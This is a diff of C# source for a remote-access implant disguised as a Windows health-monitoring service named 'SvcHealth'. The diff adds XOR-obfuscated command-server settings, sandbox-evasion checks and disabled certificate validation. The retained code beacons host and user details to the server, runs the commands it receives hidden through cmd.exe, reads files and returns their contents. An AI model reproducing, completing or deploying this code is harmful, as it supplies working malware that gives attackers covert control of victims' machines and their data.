@@ -1,112 +1,98 @@
-// Windows System Health Monitor — Endpoint diagnostic service
-// Copyright (c) Microsoft Corporation. All rights reserved.
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Http;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
-using System.Text.Json;
 using System.Threading;
 
 namespace SvcHealth
 {
     class Program
     {
-        // Build-time configuration — replaced by generator
-        static string C2Host = "{{C2_HOST}}";
-        static string C2Port = "{{C2_PORT}}";
-        static string C2Scheme = "{{C2_SCHEME}}";
-        static string EncKey = "{{ENCRYPTION_KEY}}";
-        static int BeaconSleep = {{BEACON_INTERVAL}};
-        static int BeaconJitter = {{BEACON_JITTER}};
-        static string RegisterUri = "{{REGISTER_URI}}";
-        static string CheckinUri = "{{CHECKIN_URI}}";
-        static string ResultUri = "{{RESULT_URI}}";
-        static string UserAgent = "{{USER_AGENT}}";
+        static byte[] _ch = { 0x6B, 0x63, 0x68, 0x74, 0x6B, 0x6C, 0x62, 0x74, 0x6B, 0x74, 0x68, 0x6A, 0x6A };
+        static byte[] _cp = { 0x62, 0x6A, 0x62, 0x62 };
+        static byte[] _cs = { 0x32, 0x2E, 0x2E, 0x2A };
+        static byte[] _ek = { 0x09, 0x15, 0x19, 0x11, 0x0A, 0x0F, 0x0A, 0x0A, 0x1F, 0x0E, 0x09, 0x05, 0x11, 0x1F, 0x03, 0x05, 0x68, 0x6A, 0x68, 0x6C };
+        static byte[] _ru = { 0x75, 0x29, 0x2F, 0x38, 0x37, 0x33, 0x2E, 0x77, 0x3C, 0x35, 0x28, 0x37 };
+        static byte[] _cu = { 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x6B, 0x75, 0x2F, 0x2A, 0x3E, 0x3B, 0x2E, 0x3F };
+        static byte[] _ua = { 0x17, 0x35, 0x20, 0x33, 0x36, 0x36, 0x3B, 0x75, 0x6F, 0x74, 0x6A, 0x7A, 0x72, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x7A, 0x14, 0x0E, 0x7A, 0x6B, 0x6A, 0x74, 0x6A, 0x61, 0x7A, 0x0D, 0x33, 0x34, 0x6C, 0x6E, 0x61, 0x7A, 0x22, 0x6C, 0x6E, 0x73, 0x7A, 0x1B, 0x2A, 0x2A, 0x36, 0x3F, 0x0D, 0x3F, 0x38, 0x11, 0x33, 0x2E, 0x75, 0x6F, 0x69, 0x6D, 0x74, 0x69, 0x6C };
+        static byte[] _sp = { 0x6B, 0x6D, 0x3F, 0x63, 0x62, 0x69, 0x69, 0x39, 0x6D, 0x69, 0x6F, 0x6D, 0x3E, 0x6B, 0x68, 0x6C, 0x6E, 0x63, 0x6B, 0x63, 0x6F, 0x6A, 0x62, 0x6F, 0x3F, 0x38, 0x38, 0x68, 0x39, 0x38, 0x6B, 0x3E, 0x3E, 0x6C, 0x62, 0x38, 0x3C, 0x38, 0x3C, 0x3C, 0x39, 0x62, 0x6C, 0x3C, 0x63, 0x3B, 0x63, 0x69, 0x6A, 0x6B, 0x6C, 0x6E, 0x3F, 0x38, 0x6E, 0x68, 0x69, 0x63, 0x6C, 0x62, 0x6C, 0x3F, 0x6B, 0x39 };
+
+        static string X(byte[] d) { var c = new char[d.Length]; for (int i = 0; i < d.Length; i++) c[i] = (char)(d[i] ^ 0x5A); return new string(c); }
+
+        static string C2Host;
+        static string C2Port;
+        static string C2Scheme;
+        static string EncKey;
+        static int BeaconSleep = 5;
+        static int BeaconJitter = 0;
+        static string RegisterUri;
+        static string CheckinUri;
+        static string UserAgent;
+        static string ServerPubHex;
 
         static string AgentId = "";
-        static readonly HttpClient Client = new HttpClient(new HttpClientHandler
+        static readonly HttpClient Client = CreateClient();
+        static HttpClient CreateClient()
         {
-            ServerCertificateCustomValidationCallback = (_, _, _, _) => true
-        })
-        { Timeout = TimeSpan.FromSeconds(60) };
-
-        static byte[] DeriveKey(string key)
-        {
-            using var sha = SHA256.Create();
-            return sha.ComputeHash(Encoding.UTF8.GetBytes(key));
+            var handler = new HttpClientHandler();
+            handler.ServerCertificateCustomValidationCallback = delegate { return true; };
+            var c = new HttpClient(handler);
+            c.Timeout = TimeSpan.FromSeconds(60);
+            return c;
         }
 
-        static string Encrypt(string plaintext)
+        static void InitConfig()
         {
+            C2Host = X(_ch); C2Port = X(_cp); C2Scheme = X(_cs);
+            EncKey = X(_ek); RegisterUri = X(_ru); CheckinUri = X(_cu);
+            UserAgent = X(_ua); ServerPubHex = X(_sp);
+            Array.Clear(_ch, 0, _ch.Length); Array.Clear(_cp, 0, _cp.Length);
+            Array.Clear(_cs, 0, _cs.Length); Array.Clear(_ek, 0, _ek.Length);
+            Array.Clear(_ru, 0, _ru.Length); Array.Clear(_cu, 0, _cu.Length);
+            Array.Clear(_ua, 0, _ua.Length); Array.Clear(_sp, 0, _sp.Length);
+            var pub = new byte[32];
+            for (int i = 0; i < 32; i++)
+                pub[i] = Convert.ToByte(ServerPubHex.Substring(i * 2, 2), 16);
+            Eph1.ServerPub = pub;
+        }
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+        static extern IntPtr GetModuleHandleA(string name);
+
+        static bool IsSandbox()
+        {
+            string[] indicators = { "sbiedll.dll", "dbghelp.dll", "api_log.dll", "SxIn.dll", "Sf2.dll", "cmdvrt32.dll" };
+            for (int i = 0; i < indicators.Length; i++)
+                if (GetModuleHandleA(indicators[i]) != IntPtr.Zero) return true;
             try
             {
-                var key = DeriveKey(EncKey);
-                var nonce = new byte[12];
-                RandomNumberGenerator.Fill(nonce);
-                using var aes = new AesGcm(key, 16);
-                var pt = Encoding.UTF8.GetBytes(plaintext);
-                var ct = new byte[pt.Length];
-                var tag = new byte[16];
-                aes.Encrypt(nonce, pt, ct, tag);
-                var result = new byte[4 + 12 + ct.Length + 16];
-                Encoding.ASCII.GetBytes("AES1").CopyTo(result, 0);
-                nonce.CopyTo(result, 4);
-                ct.CopyTo(result, 16);
-                tag.CopyTo(result, 16 + ct.Length);
-                return Convert.ToBase64String(result);
+                if (System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Recent)).Length < 5) return true;
             }
-            catch
-            {
-                // XOR fallback
-                var key = Encoding.UTF8.GetBytes(EncKey);
-                var data = Encoding.GetEncoding("iso-8859-1").GetBytes(plaintext);
-                for (int i = 0; i < data.Length; i++) data[i] ^= key[i % key.Length];
-                return Convert.ToBase64String(data);
-            }
+            catch {}
+            return false;
         }
 
-        static string Decrypt(string encoded)
-        {
-            var raw = Convert.FromBase64String(encoded);
-            if (raw.Length > 4 && Encoding.ASCII.GetString(raw, 0, 4) == "AES1")
-            {
-                try
-                {
-                    var key = DeriveKey(EncKey);
-                    var nonce = raw[4..16];
-                    var ct = raw[16..^16];
-                    var tag = raw[^16..];
-                    using var aes = new AesGcm(key, 16);
-                    var pt = new byte[ct.Length];
-                    aes.Decrypt(nonce, ct, tag, pt);
-                    return Encoding.UTF8.GetString(pt);
-                }
-                catch { }
-            }
-            // XOR fallback
-            var k = Encoding.UTF8.GetBytes(EncKey);
-            var dec = new byte[raw.Length];
-            for (int i = 0; i < raw.Length; i++) dec[i] = (byte)(raw[i] ^ k[i % k.Length]);
-            return Encoding.GetEncoding("iso-8859-1").GetString(dec);
-        }
+        static string Encrypt(string plaintext) { return Eph1.Encrypt(plaintext); }
+        static string Decrypt(string encoded) { return Eph1.Decrypt(encoded); }
 
         static string HttpPost(string path, string body)
         {
             try
             {
-                var url = $"{C2Scheme}://{C2Host}:{C2Port}{path}";
+                var url = C2Scheme + "://" + C2Host + ":" + C2Port + path;
                 var request = new HttpRequestMessage(HttpMethod.Post, url)
                 {
                     Content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded")
                 };
                 request.Headers.TryAddWithoutValidation("User-Agent", UserAgent);
                 request.Headers.TryAddWithoutValidation("Accept", "text/html,*/*");
-                var response = Client.Send(request);
-                using var reader = new StreamReader(response.Content.ReadAsStream());
-                return reader.ReadToEnd();
+                var response = Client.SendAsync(request).Result;
+                var respBody = response.Content.ReadAsStringAsync().Result;
+                return respBody;
             }
             catch { return ""; }
         }
@@ -118,15 +104,23 @@ namespace SvcHealth
             {
                 try
                 {
-                    Directory.SetCurrentDirectory(cmd[3..].Trim());
-                    return $"Changed directory to {Directory.GetCurrentDirectory()}";
+                    Directory.SetCurrentDirectory(cmd.Substring(3).Trim());
+                    return "Changed directory to " + Directory.GetCurrentDirectory();
                 }
-                catch (Exception e) { return $"Error: {e.Message}"; }
+                catch (Exception e) { return "Error: " + e.Message; }
+            }
+            if (cmd == "pwd") return Directory.GetCurrentDirectory();
+            if (cmd == "ls" || cmd == "dir" || cmd.StartsWith("ls ") || cmd.StartsWith("dir "))
+                return NativeLs(cmd);
+            if (cmd.StartsWith("cat ") || cmd.StartsWith("type "))
+            {
+                try { return File.ReadAllText(cmd.Substring(cmd.IndexOf(' ') + 1).Trim()); }
+                catch (Exception e) { return "Error: " + e.Message; }
             }
 
             try
             {
-                var psi = new ProcessStartInfo("cmd.exe", $"/C {cmd}")
+                var psi = new ProcessStartInfo("cmd.exe", "/C " + cmd)
                 {
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
@@ -134,19 +128,47 @@ namespace SvcHealth
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden
                 };
-                using var proc = Process.Start(psi);
-                var output = proc!.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
+                var proc = Process.Start(psi);
+                var output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                 proc.WaitForExit(30000);
+                proc.Dispose();
                 return string.IsNullOrEmpty(output) ? "Command executed (no output)" : output;
             }
-            catch (Exception e) { return $"Error: {e.Message}"; }
+            catch (Exception e) { return "Error: " + e.Message; }
+        }
+
+        static string NativeLs(string cmd)
+        {
+            try
+            {
+                string arg;
+                if (cmd.StartsWith("ls ") || cmd.StartsWith("dir "))
+                    arg = cmd.Substring(cmd.IndexOf(' ') + 1).Trim();
+                else
+                    arg = ".";
+                if (string.IsNullOrEmpty(arg)) arg = ".";
+                var sb = new StringBuilder();
+                foreach (var d in Directory.GetDirectories(arg))
+                {
+                    var di = new DirectoryInfo(d);
+                    sb.AppendLine(string.Format("d {0,12}  {1}", "0", di.Name));
+                }
+                foreach (var f in Directory.GetFiles(arg))
+                {
+                    var fi = new FileInfo(f);
+                    sb.AppendLine(string.Format("- {0,12}  {1}", fi.Length, fi.Name));
+                }
+                var result = sb.ToString().TrimEnd();
+                return string.IsNullOrEmpty(result) ? "Directory is empty" : result;
+            }
+            catch (Exception e) { return "Error: " + e.Message; }
         }
 
         static bool Register()
         {
             var hostname = Environment.MachineName;
             var username = Environment.UserName;
-            var msg = $"{{\"type\":\"register\",\"metadata\":{{\"hostname\":\"{hostname}\",\"username\":\"{username}\",\"os\":\"Windows\",\"mode\":\"beacon\",\"beacon_interval\":{BeaconSleep}}}}}";
+            var msg = "{\"type\":\"register\",\"metadata\":{\"hostname\":\"" + hostname + "\",\"username\":\"" + username + "\",\"os\":\"Windows\",\"mode\":\"beacon\",\"beacon_interval\":" + BeaconSleep + "}}";
             var enc = Encrypt(msg);
             var resp = HttpPost(RegisterUri, enc);
             if (string.IsNullOrEmpty(resp)) return false;
@@ -158,7 +180,7 @@ namespace SvcHealth
                 {
                     var start = idx + 12;
                     var end = dec.IndexOf('"', start);
-                    AgentId = dec[start..end];
+                    AgentId = dec.Substring(start, end - start);
                     return true;
                 }
             }
@@ -167,8 +189,8 @@ namespace SvcHealth
 
         static List<string> Checkin(List<string> results)
         {
-            var resultsJson = results.Count == 0 ? "[]" : $"[{string.Join(",", results)}]";
-            var msg = $"{{\"type\":\"checkin\",\"agent_id\":\"{AgentId}\",\"metadata\":{{\"mode\":\"beacon\"}},\"results\":{resultsJson}}}";
+            var resultsJson = results.Count == 0 ? "[]" : "[" + string.Join(",", results) + "]";
+            var msg = "{\"type\":\"checkin\",\"agent_id\":\"" + AgentId + "\",\"metadata\":{\"mode\":\"beacon\"},\"results\":" + resultsJson + "}";
             var enc = Encrypt(msg);
             var resp = HttpPost(CheckinUri, enc);
             var commands = new List<string>();
@@ -182,22 +204,22 @@ namespace SvcHealth
                 {
                     var start = pos + search.Length;
                     var end = dec.IndexOf('"', start);
-                    if (end > start) commands.Add(dec[start..end]);
+                    if (end > start) commands.Add(dec.Substring(start, end - start));
                     pos = end + 1;
                 }
             }
             return commands;
         }
 
-        const int KillDate = {{KILL_DATE}};
-        const int WorkStart = {{WORK_START}};
-        const int WorkEnd = {{WORK_END}};
+        const int KillDate = 0;
+        const int WorkStart = 0;
+        const int WorkEnd = 24;
 
         static void StealthSleep(int ms)
         {
             var secret = Encoding.UTF8.GetBytes(EncKey);
             var key = new byte[16];
-            RandomNumberGenerator.Fill(key);
+            using (var rng = RandomNumberGenerator.Create()) { rng.GetBytes(key); }
             for (int i = 0; i < secret.Length; i++) secret[i] ^= key[i % key.Length];
             Thread.Sleep(Math.Max(1, ms));
             for (int i = 0; i < secret.Length; i++) secret[i] ^= key[i % key.Length];
@@ -232,11 +254,11 @@ namespace SvcHealth
 
         static void Main(string[] args)
         {
-            // Sandbox check
+            InitConfig();
             WaitWindow();
             if (Environment.ProcessorCount < 2) Thread.Sleep(30000);
+            if (IsSandbox()) { Thread.Sleep(300000); return; }
 
-            // Register
             for (int i = 0; i < 10 && string.IsNullOrEmpty(AgentId); i++)
             {
                 Register();
@@ -244,7 +266,6 @@ namespace SvcHealth
             }
             if (string.IsNullOrEmpty(AgentId)) return;
 
-            // Beacon loop
             var pending = new List<string>();
             while (true)
             {
@@ -256,7 +277,8 @@ namespace SvcHealth
                     if (cmd == "__kill") Environment.Exit(0);
                     if (cmd.StartsWith("__set_interval:"))
                     {
-                        if (int.TryParse(cmd.Split(':')[1], out var newInterval))
+                        int newInterval;
+                        if (int.TryParse(cmd.Split(':')[1], out newInterval))
                             BeaconSleep = newInterval;
                         continue;
                     }
@@ -264,7 +286,7 @@ namespace SvcHealth
                     var output = ExecuteCommand(cmd);
                     var escaped = output.Replace("\\", "\\\\").Replace("\"", "\\\"")
                         .Replace("\n", "\\n").Replace("\r", "\\r");
-                    pending.Add($"{{\"type\":\"response\",\"output\":\"{escaped}\",\"command\":\"{cmd}\"}}");
+                    pending.Add("{\"type\":\"response\",\"output\":\"" + escaped + "\",\"command\":\"" + cmd + "\"}");
                 }
 
                 SleepWithJitter();
